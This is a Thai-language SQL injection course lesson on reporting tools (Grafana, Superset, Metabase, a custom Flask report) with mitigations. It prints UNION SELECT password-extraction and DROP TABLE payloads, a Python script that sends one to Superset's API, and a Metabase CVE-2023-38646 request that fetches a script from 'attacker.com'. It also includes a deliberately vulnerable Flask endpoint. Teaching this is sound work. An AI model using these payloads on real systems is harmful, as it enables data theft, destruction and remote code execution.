# Part 075: SQL Injection ใน Reporting Tools

## ภาพรวม

Grafana, Kibana, Superset และ BI tools มีช่องโหว่ SQL injection

**ขั้นตอนที่ 1196-1210**

---

## 1196. Grafana SQLi

```
# Grafana CVE-2019-19499 (Grafana <6.7.3)
# Grafana ใช้ signed URL params สำหรับ datasource queries
# สามารถ inject SQL ใน panel queries

# Grafana panel ที่ vulnerable:
# SELECT $__timeGroup(created_at,$__interval), COUNT(*) 
# FROM events
# WHERE $__timeFilter(created_at)
# AND category='${category}'
# GROUP BY 1

# ถ้า category parameter เป็น URL param และไม่ถูก sanitize:
# ?var-category=sales' UNION SELECT 1,password FROM users--

# Grafana alert notification SQLi:
# ใน alert conditions: threshold = "10; DROP TABLE events--"
```

---

## 1197. Apache Superset SQLi

```python
# Superset เป็น BI tool ที่ support SQL queries
# อาจมี injection ใน filter/dashboard parameters

import requests

# Superset API injection
def test_superset_sqli(base_url: str, token: str):
    # ผ่าน explore filter
    payload = {
        "datasource_id": 1,
        "datasource_type": "table",
        "queries": [{
            "filters": [{
                "col": "user_id",
                "op": "==",
                "val": "1 UNION SELECT 1,password,3,4 FROM users-- -"
            }]
        }]
    }
    
    r = requests.post(
        f"{base_url}/api/v1/chart/data",
        json=payload,
        headers={"Authorization": f"Bearer {token}"},
        timeout=10
    )
    
    if r.status_code == 200:
        data = r.json()
        print(f"Response: {str(data)[:200]}")

# Secure: ใช้ Superset SQL Lab permission model
# และ enable 'Prevent SQL injection' setting
```

---

## 1198. Metabase SQLi

```
# Metabase CVE-2023-38646 (Pre-auth RCE via SQLi)
# ยังไม่ setup ก็ RCE ได้!

POST /api/setup/validate
Content-Type: application/json

{
  "token": "<setup-token>",
  "details": {
    "is_full_sync": false,
    "is_on_demand": false,
    "schedules": {},
    "advanced-options": false,
    "ssl": false,
    "tunnel_enabled": false,
    "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1;INIT=RUNSCRIPT FROM 'http://attacker.com/rce.sql'",
    "port": null,
    "dbname": "zip:/app/metabase.jar!/sample-database.db",
    "host": "notexist",
    "user": "none",
    "password": "none",
    "engine": "h2",
    "name": "test"
  }
}

# CVE-2023-38646: H2 console injection via INIT parameter
# Fix: Update Metabase ไป v0.46.6.1+
```

---

## 1199. Custom Reporting SQL Injection

```python
# Custom report builder ที่ให้ user filter data

from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

# VULNERABLE:
@app.route('/report')
def vulnerable_report():
    date_from = request.args.get('from', '')
    date_to = request.args.get('to', '')
    
    conn = sqlite3.connect('reports.db')
    cursor = conn.cursor()
    # ไม่ถูกต้อง!
    query = f"SELECT * FROM sales WHERE date BETWEEN '{date_from}' AND '{date_to}'"
    cursor.execute(query)
    return jsonify(cursor.fetchall())

# SECURE:
@app.route('/report/safe')
def safe_report():
    date_from = request.args.get('from', '')
    date_to = request.args.get('to', '')
    
    # Validate format
    import re
    if not re.match(r'^\d{4}-\d{2}-\d{2}$', date_from) or \
       not re.match(r'^\d{4}-\d{2}-\d{2}$', date_to):
        return jsonify({'error': 'Invalid date format'}), 400
    
    conn = sqlite3.connect('reports.db')
    cursor = conn.cursor()
    cursor.execute(
        "SELECT * FROM sales WHERE date BETWEEN ? AND ?",
        (date_from, date_to)
    )
    return jsonify(cursor.fetchall())
```

---

## สรุป

Reporting Tools SQLi:
- **Grafana** - panel variable injection
- **Superset** - API filter injection
- **Metabase** - CVE-2023-38646 H2 INIT
- **Custom BI** - date/filter parameter injection
- **Prevention** - parameterized, input validation

---

*Part 075 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
